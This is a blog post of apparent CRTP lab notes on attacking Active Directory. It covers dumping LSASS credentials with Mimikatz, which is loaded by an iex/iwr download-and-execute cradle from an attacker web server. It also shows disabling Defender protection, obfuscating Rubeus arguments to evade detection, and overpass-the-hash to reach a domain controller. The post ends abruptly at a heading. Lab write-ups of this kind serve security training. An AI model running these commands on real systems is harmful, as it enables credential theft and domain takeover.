---
title: Active Directory (AD) | Local Privilege Escalation (Part 2)
date: 2024-07-01 00:00:00
categories: [Cert, CRTP]
tags: [cert,active directory]     # TAG names should always be lowercase
render_with_liquid: false
---

## Extract Credentials from LSASS (Invoke Mimikatz)

Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**

Check if we can run commands on dcorp-mgmt using PowerShell remoting

```bash
Invoke-Command -ScriptBlock {$env:username;$env:computername}    -ComputerName dcorp-mgmt
```

Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin. This script is to downloads and executes the Invoke-Mimi.ps1 that is hosted in my web server.

```bash
 iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
```

Then, we need to bypass the AMSI using our [script](https://beardenx.github.io/posts/Bypass-AMSI-Like-a-King/). OR

we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt


```jsx
---
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
---
```

### Using OverPass-the-Hash (Rubeus)

Finally, use OverPass-the-Hash to use svcadmin's credentials.

Run the below commands from an elevated shell on the student VM to use Rubeus.

```jsx
---
ArgSplit.bat

#Run the above commands in the same command prompt session
set "z=t"
set "y=g"
set "x=t"
set "w=k"
set "v=s"
set "u=a"
set "Pwn=%u%%v%%w%%x%%y%%z%"
---
```


```jsx
---
Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
---
```

Now, we get our TGT Ticket. Try accessing the domain controller from the new process!
Note that we did not need to have direct access to dcorp-mgmt from student machine 100.X.

```jsx
---
winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
---
```

# 7. Domain Admin Escalation using Derivative Local Admin (Find-PSRemotingLocalAdminAccess.ps1)


```jsx
---
 Find-PSRemotingLocalAdminAccess
---
```

Bypassing Applocker
